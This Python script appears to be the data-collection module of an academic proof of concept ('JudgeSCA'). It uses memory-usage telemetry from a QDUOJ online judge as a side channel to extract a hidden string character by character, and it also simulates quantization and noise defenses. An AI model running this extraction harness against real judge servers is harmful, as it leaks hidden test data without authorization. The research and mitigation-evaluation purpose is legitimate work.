import argparse
import time
import math
import random
import os
import pandas as pd
import sys

# Add parent to path so we can import from poc
sys.path.append(os.path.abspath(os.path.join(os.path.dirname(__file__), '..')))
from poc.client import OJClient
from poc.extractor import SideChannelExtractor
from poc.payload import get_calibration_payload, get_character_extraction_payload

def apply_emulated_defense(mem, mode='none'):
    """
    Client-Side Emulated Defense (Trace-driven simulation).
    We take the true memory telemetry and apply theoretical mitigation functions
    before decoding, simulating a patched server without changing the C codebase.
    """
    if mem == -1 or mem is None:
        return mem
    if mode == 'none':
        return mem
    elif mode == 'quantize':
        # 方案 A: Coarse-grained quantization (e.g. 16MB)
        # 降低遙測解析度，符合最小權限原則
        QUANTIZATION_UNIT = 16 * 1024 * 1024
        return math.ceil(mem / QUANTIZATION_UNIT) * QUANTIZATION_UNIT
    elif mode == 'noise':
        # 方案 B: Differential Privacy Noise
        # 注入高斯雜訊破壞線性通道
        sigma = 256 * 1024 # 256KB standard deviation
        noise = random.gauss(0, sigma)
        return int(mem + noise)
    return mem

class DataCollector:
    def __init__(self, url, user, password, problem_id):
        self.client = OJClient(url)
        if not self.client.login(user, password):
            raise Exception("[-] Login failed.")
        self.extractor = SideChannelExtractor(self.client, problem_id)
        
        self.data_dir = os.path.join(os.path.dirname(__file__), 'data')
        os.makedirs(self.data_dir, exist_ok=True)

    def collect_quantization_data(self, iterations=30):
        print(f"[*] Collecting quantization data ({iterations} iterations per point)...")
        # Sample points across the 0-255 range
        points = list(range(0, 256, 16))
        if 255 not in points: 
            points.append(255)
            
        results = []
        for val in points:
            print(f"  - Sampling val={val}")
            for i in range(iterations):
                code = get_calibration_payload(val)
                mem, latency = self.extractor.submit_and_wait(code, return_latency=True)
                
                if mem is not None and mem != -1:
                    # Apply trace-driven simulations
                    mem_quantized = apply_emulated_defense(mem, 'quantize')
                    mem_noisy = apply_emulated_defense(mem, 'noise')
                    
                    results.append({
                        'val': val,
                        'iteration': i,
                        'memory_cost_raw': mem,
                        'memory_cost_quantized': mem_quantized,
                        'memory_cost_noisy': mem_noisy,
                        'latency_sec': latency
                    })
                time.sleep(0.1) # Small delay to avoid overwhelming the server
                
        df = pd.DataFrame(results)
        out_path = os.path.join(self.data_dir, 'calibration_data.csv')
        df.to_csv(out_path, index=False)
        print(f"[+] Saved {len(df)} samples to {out_path}")

    def collect_throughput_ber_data(self, target_string="hello, world!\n", delays=[0, 0.5, 1.0, 2.0]):
        print("[*] Collecting throughput and BER data...")
        if not self.extractor.is_calibrated:
            self.extractor.calibrate()
            
        results = []
        for delay in delays:
            print(f"  - Testing with forced network delay = {delay}s")
            start_time = time.time()
            extracted_str = ""
            errors = 0
            
            # Extract the string char by char
            for i in range(len(target_string)):
                prefix = extracted_str
                # Use raw extractor since we already calibrated
                c = self.extractor.extract_character(prefix)
                
                # If extraction returns None (EOF reached early) or empty, we stop
                if c is None or c == '':
                    break
                    
                extracted_str += c
                time.sleep(delay)
                
            total_time = time.time() - start_time
            throughput = len(extracted_str) / total_time if total_time > 0 else 0
            
            # Calculate errors: character mismatches + missing characters
            errors = 0
            for i in range(max(len(target_string), len(extracted_str))):
                char_expected = target_string[i] if i < len(target_string) else None
                char_actual = extracted_str[i] if i < len(extracted_str) else None
                if char_expected != char_actual:
                    errors += 1
                    
            ber = (errors / max(len(target_string), 1)) * 100
            
            print(f"    -> Extracted: {extracted_str} | BER: {ber:.2f}% | Throughput: {throughput:.2f} B/s")
            
            results.append({
                'delay_sec': delay,
                'throughput_bps': throughput,
                'ber_percent': ber,
                'extracted_string': extracted_str,
                'total_time': total_time
            })
            
        df = pd.DataFrame(results)
        out_path = os.path.join(self.data_dir, 'throughput_data.csv')
        df.to_csv(out_path, index=False)
        print(f"[+] Saved throughput data to {out_path}")

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="JudgeSCA Academic Data Collector")
    parser.add_argument("--url", required=True, help="Base URL of QDUOJ")
    parser.add_argument("--user", required=True, help="Username")
    parser.add_argument("--password", required=True, help="Password")
    parser.add_argument("--problem", required=True, help="Target Problem ID")
    parser.add_argument("--iter", type=int, default=30, help="Iterations per point for quantization")
    parser.add_argument("--skip-throughput", action="store_true", help="Skip the slow throughput test")
    
    args = parser.parse_args()
    
    print("="*50)
    print("JudgeSCA Academic Data Collection Module")
    print("="*50)
    
    collector = DataCollector(args.url, args.user, args.password, args.problem)
    collector.collect_quantization_data(iterations=args.iter)
    
    if not args.skip_throughput:
        collector.collect_throughput_ber_data()
